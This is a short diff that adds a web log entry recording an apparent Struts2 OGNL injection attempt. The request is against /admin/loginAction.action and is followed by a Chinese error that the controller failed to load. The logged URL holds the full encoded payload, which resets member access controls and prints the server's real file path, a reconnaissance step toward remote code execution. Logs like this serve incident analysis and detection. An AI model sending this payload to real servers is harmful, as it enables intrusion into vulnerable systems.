@@ -1,0 +1,3 @@
+[ 2016-09-20T16:00:36+08:00 ] 220.176.204.84 /admin/loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a
+ERR: 无法加载控制器:LoginAction.action
+
